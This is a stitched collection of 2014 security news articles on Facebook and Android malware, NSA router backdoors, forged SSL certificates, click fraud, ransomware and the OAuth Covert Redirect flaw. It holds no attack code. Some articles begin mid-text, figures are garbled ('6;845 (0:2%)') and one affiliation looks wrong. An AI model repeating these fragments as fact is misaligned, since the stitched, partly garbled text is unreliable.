A Trojan horse is currently circulating in wild through the Facebook social network that could steal your Facebook account data and Credentials. Security researchers spotted this malware campaign first in the beginning of March this year, where the Trojan spreads itself through the Facebook’s Messenger service (inbox) by messaging a victim pretending to be one of their friends saying \"LOL\" with a zip file attached, which appears to be a photo, named \"IMG_xxxx.zip\". In Past two weeks, many of our readers informed us that they received similar ZIP files from their trusted Facebook friends. The Hacker News team also noticed that despite after several warnings in media, once again the malware campaign just goes viral like any other video scam, but this time directly through users’ inbox-to-inbox. HOW DOES TROJAN CAMPAIGN SPREADS Facebook User receives a file directly into the inbox from one of the trusted friends, appears to be a photo, named 'IMG_xxxx.zip' with messages ‘LOL’, OMG,\"Have a look at this\" ,\"I can't believe someone posted this\" The User downloads the file, assuming it to be from trusted friend and unzip it on desktop. The Zip file contains a jar file called 'IMG_xxxx.jar' which executes when the user click it. The Jar file itself is not a virus, but a malware agent, which actually download a file remotely from a pre-defined Dropbox account (as shown in the code). Once downloaded, it installs the malware as a service on the victim's system. Then it spread itself further to his Facebook Friends by sending similar malicious message automatically in the background. To evade detection, the malware injects itself into legitimate processes currently running on the victims’ system. This way the malware campaign is spreading like a chain reaction rapidly from last few weeks. ARE YOU AFFECTED? To check if you have fall a victim to this attack and have opened any such file sent by your trusted friend, scan your whole system using a reputed antivirus solution and just to be on a safer side change your Facebook account password. Researchers found the malware as a variant of the Zusy Trojan, which operates by hooking into web browsers in order to steal credit card number or password and send it to the remote malware author. HOW TO PROTECT? Before opening any such file, ask the sender if the file is prior to download or not. If they deny, Simply DO NOT DOWNLOAD it. Cyber criminals have discovered yet another method to utilize the world’s most popular social networks for their own beneficial purposes, and because Facebook has become one of the most popular social networking website with more than one billion active users this year, it serves as a vast platform for scammers and cyber criminals to spread malware or virus infections. So, protect yourself from the threats - Stay Tuned to 'The Hacker News'." }

To protect its users and their devices from harm, Google launched this apps scanning software tool, two year ago. Bouncer is a security feature for the Android Play store Market that is designed to protect the Android users to not to be a victim of any malicious Android malware app. But does the security tool go far enough? Despite having protective shield factor, we have seen Google play store market is surrounded by many malicious apps which easily by-passes the Bouncer scan test and targets Android users. Security Research from Columbia University have exploited weaknesses in Google's Bouncer service to sneak malicious apps on to the Android market. They published a new research paper, revealed that all such dynamic analysis tools and services are vulnerable to most of the evasion techniques they discovered. Along with the Google bouncer, other Heuristic analysis (Dynamic) analysis tools detect malicious application based on previous knowledge of typical sequences of commands in code or of metadata (static analysis), or on behavior (dynamic analysis). The research paper [pdf] titled “Rage Against the Virtual Machine: Hindering Dynamic Analysis of Android Malware” was conducted by the team of five researchers, Thanasis Petsas, Giannis Voyatzis, Elias Athanasopoulos, Michalis Polychronakis and Sotiris Ioannidis of the Institute of Computer Science from the Columbia University, USA. They created some malware samples, those were able to hide themselves when analyzed in an emulated environment and hence developed the capability to bypass the heuristic-based dynamic and static analysis platforms, such as Andrubis, DroidBox, DroidScope, APK Analyzer, or APKScan. “A malicious program can try to infer whether it runs in an emulated environment, and therefore evade detection by pausing all malicious activities.” the researchers said. \"Even trivial techniques, such as checking the value of the IMEI, are enough to evade some of the existing dynamic analysis frameworks.\" The team modified some real-world Android Malware to include the bypass techniques for heuristic-based detection and tested them against a number of dynamic analysis tools. \"To assess the effectiveness of our techniques, we incorporated them in real malware samples and submitted them to publicly available Android dynamic analysis systems, with alarming results,\" they added. LAB TEST RESULTS All analyses tools failed to beat the heuristic evasion techniques. All analysis tools failed to correctly infer the malicious behavior of the repackaged malware samples. Malware writers can fingerprint the most of the analysis services based on inferred information about their execution environment in order to develop more sophisticated and perfect evasion techniques. Only one tool, called ‘APK Analyzer’ was able to detect that malware application is looking for the virtual machine status to hinder analysis. \"However Google's Bouncer would have the smarts to detect the slippery malware if it were upgraded with realistic sensor event simulation, more accurate binary translation and hybrid application execution.\" Register reported. FAILURE IN DETECTION = THREAT TO USERS Mobile malwares can pose a significant threat to the users. However, most of the evasion techniques are not new, but the paper shows that the malware authors are constantly evolving and can always find new ways to get around the security check. So malware may not only fool automated analysis systems, but this failure also raise security threat against your innocent devices by compromising them with undetectable malware. End users are advised to be extra vigilant when install application from App Stores and have the “Unknown sources” Android system setting unchecked to prevent dropped or drive-by-download app installs." }

Yesterday in a published excerpt of his forthcoming book, “No Place to Hide”, Journalist Glenn Greenwald underlines the interest of National Security Agency in planting backdoors in U.S. suppliers’ routers and other networking devices in order to carry out its massive surveillance program. \"A June 2010 report from the head of the NSA's Access and Target Development department is shockingly explicit,\" Greenwald said. \"The NSA routinely receives — or intercepts — routers, servers and other computer network devices being exported from the US before they are delivered.\" While US government is always prohibiting the purchase of Huawei products due to suspected backdoors from the Chinese government, however the book written by Glenn Greenwald reads that the US government does the same thing with US suppliers’ hardware and repackages them with a factory seal before supplying them to overseas nations. As Greenwald notes in the excerpt, “It is quite possible that Chinese firms are implanting surveillance mechanisms in their network devices. But the US is certainly doing the same.” “The agency then implants backdoor surveillance tools, repackages the devices with a factory seal, and sends them on. The NSA thus gains access to entire networks and all their users. The document gleefully observes that some ‘SIGINT tradecraft…is very hands-on (literally!)’,” Greenwald writes. According to Greenwald, the document of this new revelation is going to release today. His new book is based upon the leaked documents from 2010 provided by the former NSA contractor Edward Snowden that detailed the NSA receiving or intercepting various devices in the US before exporting them to foreign countries, which he apparently obtained from Snowden. Image Credit: Arstechnica So far, The US National Security Agency (NSA) has been working with the security firm RSA on planting backdoors to spy on people, but if these allegations by Greenwald are correct, it’s all clear that all manner of US companies must be complicity involved with the agency. By planting backdoors surveillance systems in the equipments, the NSA could feasibly gain access to the vast networks and users. \"In one recent case, after several months a beacon implanted through supply-chain interdiction called back to the NSA covert infrastructure,\" the NSA report says, according to the Guardian. \"This callback provided us access to further exploit the device and survey the network.\" It’s not first time the NSA has been accused of this type of allegation. Also a report from German newspaper Der Spiegel alleged that the US intelligence agency intercepts the shipping deliveries to plant back doors in electronic equipments in order to gain remote access of the systems, including computers’ hard drives, routers, and other devices from companies such as Cisco, Dell, Western Digital, Seagate, Maxtor, Samsung, and Huawei." }

Secure Sockets Layer (SSL) protect the web users in two ways, it uses public key encryption to encrypt sensitive information between a user’s computer and a website, such as usernames, passwords, or credit card numbers and also verify the identity of websites. Today hackers and cyber criminals are using every tantrum to steal users’ credentials and other sensitive data by injecting fake SSL certificates to the bogus websites impersonating Social media, e-commerce, and financial websites as well. DETECTING FAKE DIGITAL CERTIFICATES WIDELY A Group of researchers, Lin-Shung Huang , Alex Ricey , Erling Ellingseny and Collin Jackson, from the Carnegie Mellon University in collaboration with Facebook have analyzed [PDF] more than 3 million SSL connections and found strong evidence that at least 6;845 (0:2%) of them were in fact tampered with forged certiﬁcates i.e. self-signed digital certificates that aren’t authorized by the legitimate website owners, but will be accepted as valid by most browsers. They utilized the widely-supported Flash Player plug-in to enable socket functionality and implemented a partial SSL handshake on our own to capture forged certiﬁcates and deployed this detection mechanism on an Alexa top 10 website, Facebook, which terminates connections through a diverse set of network operators across the world. Generally Modern web browsers display a warning message when encountering errors during SSL certiﬁcate validation, but warning page still allows users to proceed over a potentially insecure connection. Fake SSL connections can argue that certiﬁcate warnings are mostly caused by server mis-conﬁgurations. According to usability survey, many users actually ignore SSL certiﬁcate warnings and trusting forged certificates could make them vulnerable to the simplest SSL interception attacks. This means that a potential hacker can successfully impersonate any website, even for secure connections i.e. HTTPS, to perform an SSL ma-in-the-middle attack in order to intercept encrypted connections. FAKE DIGITAL CERTIFICATES SIGNED WITH STOLEN KEYS FROM ANTIVIRUS Researchers observed most of the forged SSL certiﬁcate are using same name as original Digital Certificate issuer organizations, such as VeriSign, Comodo. Some Antivirus software such as Bitdefender, ESET, BullGuard, Kaspersky Lab, Nordnet, DefenderPro etc., has ability to intercept/Scan SSL connection on Clients’ system in order to defend their users from Fake SSL connections. These Antivirus products generate their own certiﬁcates that would be less alarming than other Self-signed digital certificates. \"One should be wary of professional attackers that might be capable of stealing the private key of the signing certificates from antivirus vendors, which may essentially allow them to spy on the antivirus users (since the antivirus root certificate would be trusted by the client),\" the researchers explained. \"Hypothetically, governments could also compel antivirus vendors to hand over their signing keys.\" Similar capabilities are observed in various Firewall, Parental Control Software and adware software those could be compromised by hackers in order to generate valid, but fake digital certificates. DIGITAL CERTIFICATES GENERATED BY MALWARE Researchers also noticed another interesting self-signed digital certificate, named as ‘IopFailZeroAccessCreate’, which was generated by some malware on client-end systems and using same name as trusted Certificate issuer “VeriSign Class 4 Public Primary CA.” “These variants provide clear evidence that attackers in the wild are generating certiﬁcates with forged issuer attributes, and even increased their sophistication during the time frame of our study,” they said. Detected statistics shows that the clients infected with same malware serving ‘IopFailZeroAccessCreate’ bogus digital certificates were widespread across 45 different countries, including Mexico, Argentina and the United States. Malware researchers at Facebook, in collaboration with the Microsoft Security Essentials team, were able to conﬁrm these suspicions and identify the speciﬁc malware family responsible for this attack. DETECTION AND ATTACK MIGRATION TECHNIQUES Attackers may also restrict Flash-based sockets by blocking Flash socket policy traffic on port 843 or can avoid intercepting SSL connections made by the Flash Player in order to bypass detection techniques used by the researchers. To counter this, websites could possibly serve socket policy ﬁles over ﬁrewall-friendly ports (80 or 443), by multiplexing web trafﬁc and socket policy requests on their servers. In Addition, researchers have discussed migration techniques in the paper such as HTTP Strict Transport Security (HSTS), Public Key Pinning Extension for HTTP (HPKP), TLS Origin-Bound Certiﬁcates (TLS-OBC), Certiﬁcate Validation with Notaries and DNS-based Authentication of Named Entities (DANE), those could be used by servers to enforce HTTPS and validate digital certificates. HOW TO REMOVE MALWARE If you are also infected by any similar malware, please follow below given steps to remove it: Check your hosts file (C:\\Windows\\System32\\Drivers\\etc\\hosts) for malicious entries Check your DNS (Domain Name Server) settings on system and DSL Modem Verify your proxy settings on browser Cross-check your installed Browser addons.

Cyber Criminals Spreading Click Fraud Trojan for Making Money", "Address" : "https://thehackernews.com/2014/05/beware-cyber-criminals-spreading-click.html", "Date" : "2014-05-11T04:42:00-11:00", "Article" : "Before Ransomware, Click fraud was one of the popular and efficient ways for cybercriminals to make money and with the explosive growth in the size of the online threats it is still making its way on the Internet. “Click-Fraud” is the practice of deceptively clicking on search ads with the intention of either increasing third-party website revenues or exhausting an advertiser’s budget. Besides the search results, we all have seen advertisements placed in the search engine’s WebPage. If the visitor clicks the Ad, the advertiser has to pay a fee to the search engine. A problem that has arisen with pay-per-click is results in Click-Fraud. The term “fraud” is used because in either case, the advertiser is paying for a click without receiving any true value. Of course, the number of clicks has to be large enough in order to gain a considerable amount of money, and in order to do that an attacker can use an automated script or malicious program to simulate multiple clicks by a browser on an ad. Such a malicious software infection used by cybercriminals to carry out Click Fraud operations has been spotted by the researchers of Symantec. Last month, the researchers noticed a recent surge of infections which they dubbed as Trojan.Viknok. Trojan.Viknok was first observed by the security researchers in April 2013. The researchers considered the malware as a sophisticated threat because it has the ability to turn victims’ computer into a botnet. To do this, the malware is capable of gaining the elevated operating system privilege in order to infect system files on multiple Windows operating systems, including the 32 and 64-bit versions of Windows XP, Vista and 7. Then these Viknok-infected computer botnet zombies are allegedly used by cybercriminals to carry out Ad-Click Fraud and to pull more money the scammers are trying to add more victims’ computers to their botnet. “The scammers behind the current Viknok campaign have gone to a lot of effort to add more victims to their Adclick botnet, helping them make more money in the process,” states the blog post. In the last six months, there has been an increase in the use of this threat by cyber criminals and in many cases, the victims infected with the Trojan report hearing audio clips through their computers’ speakers. HOW THE VIKNOK INFECTS COMPUTERS Viknok infects the victims’ computers by injecting its payload into DLL files, but modifying the DLL files in the latest operating systems is not an easy task. In this case, cyber criminals make use of a number of methods to infect files, such as rpcss.dll, a library that runs every time the Windows is started. So, if an attacker is able to infect the rpcss.dll file, the malicious code is executed every time Windows starts. There are a number of methods to infect the rpcss.dll file, including: Using SeTakeOwnershipPrivilege function to take ownership of system files. Taking advantage of Windows’ “Dynamic-Link Library Search Order” to run a malicious DLL inside the System Preparation Tool process. Using the Run a legacy CPL elevated tool to run a DLL with elevated privileges. The most powerful technique is by exploiting the Microsoft Windows Kernel 'Win32k.sys' local Privilege Escalation Vulnerability, CVE-2013-3660 that allows to run the malicious code in kernel mode. Once installed on the computer, the Viknok uses one or more of the above techniques to inject the rpcss.dll file in victims’ computers that allow the malicious code to execute every time the operating system starts. Once rpscc.dll file is infected, it loads the core of the malware, which is usually stored in the %System% folder in an encrypted file. “In many cases, the infection process is completely stealthy; the threat does not show any warning to the user. The malware is also difficult to detect since it does not show any suspicious running process, nor does it infect any of the standard load points,” Symantec researchers note in their blog post. The malware shows the User Account Control (UAC) prompt to the victim in order to gain the elevated privileges, and if user doesn’t grant the permission, the infection will fail. But, the UAC prompt masquerade itself as a part of normal system activity, so users might give the Trojan permission without giving it too much thought. Once the permission is granted, the attacker can remotely send the infected systems commands to load various websites. The websites offer car insurance, travel tickets, domain name registration, and many other services. The count of Viknok infections has increased over the past few months. From January to April, the number of unique infections has increased from over 10,000 to 22,000 and over 16,500 unique Viknok infections have been noticed in the first week of May alone. The majority of the victims are located in the United States. Stopping click-fraud is proving as difficult as stopping e-mail spam; and click-fraud artists may be more highly motivated. It is a good idea for users to practice safe email habits, such deleting any suspicious mail received without opening or viewing them, as well as refraining from opening any suspicious attachments or Links." }

We have seen a lot of Facebook scams spreading through the Facebook timeline in wild that encourages users to click on it and fall victim, and this time some new horror scam campaign is going viral on Facebook. Christopher Boyd from the security firm Malwarebytes has discovered an epidemic of hoaxes making their way around Facebook with paranormal themes, including: Alleged footage of an “actual” ghost attack a video featuring the Aswang that is described as “a mythical shape-shifting were-dog/vampire/terrifying thing from the Philippines” a video of Mermaids claiming they are back! Video of a huge great white shark tearing apart a sea captain. Facebook has become one of the most popular social networking website with more than one billion active users this year and daily hundreds of people join the networking website to connect with new friends and reconnect with their old friends. But, with the increase in various scams on Facebook to target users, it became very clear that not only does the social networking platform provide special opportunities for people to connect and share information; it also serves as a great and useful platform for scammers to spread malware or virus infections or redirect users to the sites of their own choice. Once again scammers have targeted Facebook users and encouraging them to open the scammed video and once clicked, Facebook users are either asked to download or install updates to the video players, but actually these installations will lead to successful malware installation to the users system. According to Malwarebytes, the ghost attack scam video will led users to the install PUP.Optional.InstallBrain.A, the Aswang prompted unsuspecting Facebook users to download “scan your PC” malware, the mermaids led to an iLivid install that was actually PUP.Optional.Bandoo, whereas the shark brought users to pages filled with spammy surveys and downloads. “That concludes our spooky train ride through a mid-May haunted house of doom. Please keep your hands inside the cart until the gates have opened, and avoid clicking on fake Facebook videos at the gift counter,” Christopher Boyd of Malwarebytes wrote. We have seen various suspicious posts on Facebook, like the recent “Facebook Security Warning!!! Do this before your account gets deactivated!” scam that threatens users with account deactivation if they don't register it again, and \"See your Friend's naked video\", an app offering you a chance to see who has viewed your Facebook profile, and many more. Sometimes these scams are very obvious and easily avoidable, but many times they are irresistible and easy to fall for. So, if you are served with any such suspicious post or any other suspicious link, do not click on it, no matter it’s from your closest friend." }

This new plan would leverage the authorities to use “zero-day exploits” on software vulnerabilities during criminal investigations and according to critics the change to the law could violate the privacy rights and could weaken overall Internet security. “I don't think many Americans would be comfortable with the government sending code onto their computers without their knowledge or consent,” Nathan Freed Wessler, a lawyer with the American Civil Liberties Union, said in a telephone interview to Bloomberg “The power they're seeking is certainly a broad one.” The New proposal would also allow the authorities to use a single warrant to hack into thousands of botnet victim’s computers in order to collect evidence and technical details of the criminals. This means to find out a single culprit who could be even a foreigner, the authorities would legally authorize themselves for spying on thousands of machines legally. DOJ highlighted that the proposed change would allow law enforcement agencies to “use remote access” to search and monitor computers even when “the district where the media or information is located has been concealed through technological means.” A single warrant could be used to search computer systems located in five or more judicial districts, of which there are 94 in the United States and currently, the judges may issue a warrant in most cases only if the property to be examined is located in their district. “The proposed amendment would enable investigators to conduct a search and seize electronically stored information by remotely installing software on a large number of affected victim computers pursuant to one warrant issued by a single judge,” committee said. “The current rule, in contrast, requires obtaining multiple warrants to do so, in each of the many districts in which an affected computer may be located.” It is clearly known to all of us that both the National Security Agencies (NSA) and the Federal Bureau of Investigation have exploited several vulnerabilities to spy across the world for their own purposes and this new proposed change will definitely give them another legal authorization to carry out their spying projects secretly, and if get caught, IT’S ALL LEGAL MY FRIEND." }

It has ability to create several different forms of itself dynamically in order to thwart antimalware programs. Instagram users are also targeted by the potentially unwanted software programs that claims to enable them to download their Instagram photos and videos using desktop machines or computers. But once downloaded and installed into system, it could expose the user to a number of security vulnerabilities, often overlap with adware, warned the security firm Malwarebytes. \"In the case of Instagram, what we've seen out there could pose greater risk than, say, your average phishing site,\" said Malwarebytes intelligence analyst Jovi Umawing in a blog post. Instagram is a social networking service use for online photo-sharing and video-sharing. It allows its users to take pictures and videos, apply digital filters to them, and share them on other social networking services, such as Facebook, Twitter, Tumblr and Flickr. With the growing popularity and concern among the internet users, Instagram is widely used by people. The firm expects that in the coming years the number of users will steadily increase until at least 2016, by considering the latest statistics from the digital marketing research and analysis company eMarketers published in late March, Instagram surpassed Twitter in terms of active mobile users in the US by 2.7 million, which is really a very large number. “With news of Instagram finally beating Twitter in terms of overall usage, it’s high time that we stop, look back, and remind ourselves of the potential dangers lurking on the net specifically crafted to target Instagram users and lurkers alike,” the company warned in a blog post. Malwarebytes found a number of files and sites as well that take advantage of software’s popularity and come bundled with the downloads of such third-party programs which includes a number of potentially unwanted programs (PUPs) that could spell bad news for users. However, Potentially Unwanted Programs are not technically-classified as trojans or any other type of malware, but it serve little purpose other than using your computer as a gateway for online advertisements or as a catalyst to deliver annoying or malicious applications that may pester you to the point where you want to throw your computer out a window. “Doing a Google search surely yields sites where one can download several programs involving Instagram. Some of which can either be classed as ‘image viewers’ or ‘image and video downloaders’ publicly-accessible accounts,” the firm wrote. \"Since Instagram can be visited via Web browsers, we can easily say that these downloads target any Windows computer user who just want to keep copies of photos and videos that are likely not their own.\" There are anti-malwares to detect these kinds of threats, but this is something that remains on the users’ hand as well because the increase in the number of potentially unwanted programs and its several variants could target online users and cause danger. So, avoid downloading such programs onto your personal systems." }

Ransomware typically targets users' personal computers and has become a profitable way for cyber criminals to earn money. To deliver the Ransomware malwares to the mobile devices, cyber criminals have started creating malicious software programs that masquerade as antivirus apps or other play store apps, but instead of protecting your smart devices, they lock up your Smartphone until you pay a ransom to unlock it. RANSOMWARE - POLICE & CRYPTOLOCKER As we reported earlier in news updates, security researchers disclosed various Police ransomware targeting users' personal computers. The ransomware software once installed, cyber criminals attempts to lock the victim’s computer hard disk and files from a remote location. Usually, the police ransomware masquerade as an official warning from a law enforcement agency, which claims that the victim's PC has been determined to have visited illegal websites and payment is necessary for a fine to restore the computer's functionality. Cryptolocker is another infamous member of Ransomware family, designed to extort money from computer users by holding computer files hostage until the computer user pays a ransom fee to get them back. The Cryptolocker hijacker sniffs out your personal files and wraps them with strong encryption before it demands money. Cryptolocker Ransomware is just like any other computer infection, but it can be potentially worse since it can cause permanent damage, such as deleted files and files that become encrypted forever and the infected users are in danger of losing their personal files forever. POLICE RANSOMWARE TARGETING SMARTPHONES Similar threat has come to Smartphone devices as well and Android users might soon become the victims of \"Police Locker\" ransomware malware. According to recent report from the researcher behind the Malware don't need Coffee blog, Cyber Criminals behind the Reveton ransomware have joined Nertra Ransomware team to target Android users, along with Windows, Mac OS X and Linux. To Deliver the ransomware malware hackers are using various social engineering techniques, include lockers system, fake Antivirus solution, fake audio-video codecs and Browlock ransomware. According to the researcher, The booby-trapped (malicious) websites are so cleverly crafted in such a way: If victim visits it using Internet Explorer browser, a variant of ransomware Winlock will be offered. If victim surf it with any other browser on Windows, Linux or Mac, they will offer Brownlock malware If victim visits the site with Android browser, he will be redirected to a fake website that will automatically download a malicious application (APK file ) from the browser, disguised as a video downloader. Like other popular ransomware threats, such as FBI MoneyPak Ransomware, Ukash Virus and Police Central E-Crime Unit (PCEU) Ransomware, Android version also displays a message to threaten the user with arrest or prosecution because child pornography or other objectionable material has been found on the device. Scared or frustrated users are often willing to pay hundreds of dollars to avoid the fine or to free their system again. We also came across a report in which a man killed his 4 year old baby and then himself committed suicide after his computer got infected with “police ransomware,” which is an extent of Ransomware that has marked its history by someone’s blood. If You are already infected by any one of such malwares, stop your keyboard and don't pay the fine. Install updated Antivirus software to get rid of the ransomware virus. Android users are always advised to treat unrecognized applications or applications from third-party sources with extreme caution and try to always download applications from trusted App Stores." }

Wang Jing, a Chinese mathematics Ph.D student at the Nanyang Technological University in Singapore, found that the OAuth and OpenID open source login tools are vulnerable to the \"Covert Redirect\" exploit. The login tools ‘OAuth’ and ‘OpenID’ protocols are the commonly used open standard for authorization. OAuth designed as a way for users to sign in or sign up for other services using an existing identity of a site such as Google, Facebook, Microsoft or Twitter, whereas OpenID is a decentralized authentication system for the Internet that allows users to log in at websites across the internet with same digital identity. The Covert Redirect vulnerability could affect those who use ‘OAuth’ and ‘OpenID’ protocols to ‘login’ to the websites such as Facebook, Google, Yahoo, LinkedIn, Microsoft, VK, Mail.Ru, PayPal, GitHub and many others. WHAT MAKES IT EVEN MORE DANGEROUS?The \"Covert Redirect\" flaw masquerade as a login popup from the affected sites that could allow an attacker to steal personal data from users and redirect them to a website of the attacker's choice, which could potentially further compromise the victim. By clicking on a malicious phishing link will get a popup window in Facebook, asking them to authorize the app and to hoax the user into giving up their information instead on legitimate websites, the Covert Redirect flaw uses the real site address for authentication. Once the user login, the attacker could get the personal data, which in the case of Facebook, could include the email address, birth date, contacts, work history, etc. But, if in case “the token” has greater privilege, the attacker could obtain more sensitive information including the mailbox, friends list, online presence and most possibly even operate and control the user’s account.In a blog post yesterday Jing explained, for OAuth 2.0, the attacks could risk “the token” of the site users and whenever users authorize the login the attacker could then use that to access users’ private information. In case of OpenID, the attacker could get users’ information directly, as it’s immediately transferred from the provider upon request. However, this isn't the first time the issue has been raised and the root cause is a lack of token whitelisting in OAuth 2.0. RESPONSE FROM INTERNET GIANTS Facebook uses OAuth and something similar to OpenID. When he reported the Facebook about the vulnerability, Facebook said “they understand the risks associated with OAuth 2.0. However, short of forcing every single application on the platform to use a whitelist, [fixing the vulnerability] isn't something that can be accomplished in the short term.” Facebook isn't the only site affected, Jing reported the vulnerability to some more companies who use both OAuth and OpenID including Google, LinkedIn, Microsoft and Yahoo to discuss the problem. Google uses OpenID and told Jing, “they are aware of the problem and are tracking it at the moment,” whereas LinkedIn told they have acknowledged the problem back in march and “published a blog post on how [they] intend to address [the problem].” Microsoft replied after they investigated the matter and concluded that the vulnerability exists in the domain of a third-party which is different from the one Jing reported and recommended him to report the issue to the third-party instead. Yahoo did not reply months after he reported. “They have little incentive to fix the problem,” Jing wrote regarding the companies, “One concern is the cost and the other is that in their view, the host company is responsible for making the attacks appear more credible; therefore, it is not solely their problem.” HOW TO FIX COVERT REDIRECT VULNERABILITY According to Jing, there is no speedy fix for the vulnerability. “In the real world, a large number of third-party applications do not do this due to various reasons. This makes the systems based on OAuth 2.0 or OpenID highly vulnerable,” Jing wrote. Wang believes it's unlikely that this flaw will be patched any time soon. He says neither the authentication companies such as Google, Microsoft, Facebook, nor the client companies are taking responsibility for fixing the issue. However, to take advantage of Covert redirect vulnerability, it requires interaction from users i.e. Victim has to click on a link or visit a malicious website, and then they have to click on a Facebook login button and agree to authorize the login and release of information. So far, the security experts hasn't labelled this vulnerability as a major security flaw as Heartbleed, but still it’s a threat." }

AOL Inc. on Monday confirmed the company suffered a massive data breach that may have affected a \"significant number\" of email accounts. The company has issued a warning to users that their personal information including email addresses, postal addresses, address books, encrypted passwords and the encrypted answers to security question-answers, has been stolen by attackers, the New York-based company said Monday. \"The ongoing investigation of this serious criminal activity is our top priority,\" AOL said in a blog post. \"We are working closely with federal authorities to pursue this investigation to its resolution. Our security team has put enhanced protective measures in place, and we urge our users to take proactive steps to help ensure the security of their accounts.\" AOL said it began investigating the matter after it noticed a spike in spoofed emails from AOL user accounts. The company believes that hackers used the contact information to send spoofed emails that appear to come from roughly 2 percent of its email accounts. \"Spoofed\" emails are kind of phishing emails or messages that masquerade itself as if they have come from legitimate user accounts known to the recipient in order to trick the recipient into opening it, but in real are the links to malicious websites or malware. The company believes that neither the financial data of users such as credit and debit cards number, nor the passwords or the answer to the security questions has been revealed as the hackers weren’t be able to break the encryption. \"Importantly, we have no indication that the encryption on the passwords or the answers to security questions was broken,\" AOL wrote. \"In addition, at this point in the investigation, there is no indication that this incident resulted in disclosure of users' financial information, including debit and credit cards, which is also fully encrypted.\" Nevertheless, AOL suggests all its users to reset their passwords and also change their security questions and answers in order to protect themselves from such breaches. \"Although there is no indication that the encryption on the passwords or answers to security questions was broken, as a precautionary measure, we nevertheless strongly encourage our users and employees to reset their passwords used for any AOL service and, when doing so, also to change their security question and answer,\" AOL said. In addition, it also provided some steps to protect its users from cyber threats: Do not click on any suspicious links or attachments in the email you received. When in doubt, contact the sender to confirm that he or she actually sent the email to you or not. Never provide your personal or financial information through an email to someone you do not know. AOL will never ask you for your password or any other sensitive personal information over an email. If you found yourself a victim of spoofing, inform your friends that your emails may have been spoofed and warn them to avoid clicking the links in suspicious emails." }

Recently, Google had offered users refund and additional credit of $5 for the bogus antivirus app 'Virus Sheild' that potentially defrauded more than 10,000 Android users who have downloaded the app from the Google play store. The step taken by Google is really appreciated, as the refunding cost Google around $269,000. Now, it has been found that a number of malicious Android apps on the Google Play store secretly turn users’ android devices into small rigs contributing to a large-scale crypto currency mining operation. CRYPTO MINER IN ANDROID APP Security researchers from an anti-malware firm Lookout have identified various malware apps at Google Play Store, which they dubbed as ‘BadLepricon’ containing hidden crypto miner that stealthily exploit users’ android device to perform the cumbersome computational process without their knowledge. BadLepricon malware was specially designed to be delivered via wallpaper apps and researchers found it in five separate apps masquerading as ‘Live Wallpaper Apps’ that had more than 100 of downloads each, according to a blog post published Thursday. \"These apps did fulfill their advertised purpose in that they provided live wallpaper apps, which vary in theme from anime girls to 'epic smoke' to attractive men,\" Meghan Kelly, a Lookout security communications manager, wrote in a company blog post. \"However, without alerting you in the terms of service, BadLepricon enters into an infinite loop where -- every five seconds -- it checks the battery level, connectivity, and whether the phone's display was on.\" DETECTING MOBILE MALWARE So, if you found your mobile devices overheated harder than usual, then you may have malicious wallpaper installed in your Smartphones that could be secretly mining cryptocurrency without your knowledge, and once your device connects to the internet, the mining capabilities kick into action in the background. Due to an increase in the value of digital coins, cyber criminals has added it in their watchlist and making every effort to steal your virtual money. As we know, coin mining is the key component for digital currencies and such malware does not steal data. Instead, they are capable of mining Bitcoin, Litecoin and Dogecoin using the victim's device. Google expeditiously removed the malicious apps as soon as Lookout Mobile security firm reported it. This is not first time when an Android malware is targeting users’ Smartphones for mining crypto-currencies. Few weeks back researchers from the Antivirus firm Trend micro also spotted two such apps named - 'Songs' and 'Prized’ on Google play store that mined the Litecoin and Dogecoin cryptocurrencies without users’ knowledge, and was downloaded by more than one million users." }

The malicious Chrome browser extension dubbed as ‘Cryptsy Dogecoin (DOGE) Live Ticker’ which is available on Chrome Web store for free downloads and developed by \"TheTrollBox\" account. Reddit user noticed that the updated version of the extension has a malicious code, which is designed to hijack the crypto currency transactions. HOW CHROME EXTENSION STEALS CRYPTOCURRENCY It is very obvious that the kind of crypto related software extensions is downloaded only by the users who deal with the digital currency. So, once the user installed the malicious extension, the software within the extension starts monitoring users’ web activity and looks for those users who go to Cryptocurrency exchange sites such as Coinbase and MintPal. After realizing that the user is performing a transaction in digital coins, the malicious extension replaces the receiving address, where the user is trying to transfer his Cryptocurrency, with the a different BTC address of its own (attacker's bitcoin address) The same happened to a Reddit user, who had been reported this activity from the Cryptocurrency exchange MintPal in a withdrawal confirmation. After then he posted a Warning about the rogue extension on Reddit, advising all to “Be careful of what you install on your devices you use to access your wallets.” OTHER CHROME EXTENSIONS FROM SAME DEVELOPER TheTrollBox, the developer of malicious 'Cryptsy Dogecoin (DOGE) Live Ticker' Chrome extension has also developed 21 more similar extensions, which are currently available on Google Chrome Store. These Chrome extensions also could be susceptible to have malicious code, and Google has not taken any action against the reported chrome extensions.

After your Computers, Servers, Routers, Mobiles and Tablets, now hackers are targeting your Smart TVs, warns Eugene Kaspersky the co-founder and chief executive of Kaspersky Lab. As the increase in the manufactures of Smart TVs by different companies, it could be estimated that by 2016, over 100 million TVs are expected to be connected to the Internet and in the time it may rise as a profitable fruit for the malware authors and cyber criminals to exploit these devices. The 48 year-old Eugene Kaspersky, one of the world's top technology security experts, has thrown light on the future of Computer Security and warned that Internet of Things (IoT) such as TVs, Refrigerators, Microwave or dishwashers will necessarily bring undesirable cyber threats to your home environment, because any device connected to the Internet is vulnerable and can be infected. \"The threats will diversify to mobile phones and to the home environment, such as through televisions, which are now connected to the Internet,\" he said in an interview with the Telegraph. The Internet of Things is said to be the next evolutionary step in our connected world that has been already become a major target for cyber criminals. We have reported before that how 100,000 Refrigerators and other smart household appliances were compromised by hackers to send out 750,000 malicious spam emails; A Linux worm 'Linux.Darlloz' is hijacking Home Routers, Set-top boxes, Security Cameras, printers to mine Crypto Currencies like Bitcoin. So, the malicious software that already caused damages to your desktops, laptops and targeted your mobile devices till now, is ready to cause harm to your Smart TVs and other Internet connected smart devices. Kaspersky said his company's global research and development headquarters in Moscow is receiving around 315,000 suspicious activity reports on daily basis, that has doubled over the past year. The threats might crawl to the new sectors other than mobile phones and computer systems. “There are millions of attacks a year on Microsoft Windows, thousands on mobile phones, mostly on Android, and dozens on Apple’s iOS. But more and more engineers are developing software for Android,” he said. But according to him “technically it is possible to infect millions of devices” because all devices are vulnerable and it is very much possible to see cyber criminals developing viruses for iOS devices. The fact that I really like what he says, “What’s the difference been a TV and a computer? A bigger screen and a remote control. It has Android inside and memory chips and Internet connections. That’s all.” Well said! He also warned users that as the Internet of Things (IoTs) increases, users need to have top security packages installed on their devices. “It’s just a question of time. We already have a product for mobile and we have a prototype for TV so we are ready to address this issue when new malware for television is released by criminals.” In the last few years, this emerging domain for the Internet of Things has been attracting the 